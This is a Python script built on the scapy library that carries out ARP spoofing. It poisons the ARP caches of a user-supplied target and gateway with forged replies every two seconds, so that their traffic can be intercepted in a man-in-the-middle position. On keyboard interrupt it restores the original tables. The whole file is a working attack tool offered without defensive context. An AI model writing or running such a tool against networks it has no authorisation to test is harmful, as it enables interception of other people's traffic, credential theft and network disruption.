import subprocess
import optparse
import sys

import scapy.all as scapy
import time


# Get MAC based on IP
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


parser = optparse.OptionParser()


parser.add_option("-t", "--target", dest="target", help="The target's ip")
parser.add_option("-g", "--gateway", dest="gateway", help="The gateway ip")


(options, arguments) = parser.parse_args()

if not options.target:
    print("[E] No  target specified.  -h for help.")
    sys.exit(0)

if not options.gateway:
    print("[E] No  gateway specified.  -h for help.")
    sys.exit(0)

gateway = options.gateway
target = options.target

try:
    packets_counter = 0
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        packets_counter = packets_counter + 2
        print("\r[+] Sent " + str(packets_counter)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL C... Reseting ARP tables!")
    restore(target, gateway)
    restore(gateway, target)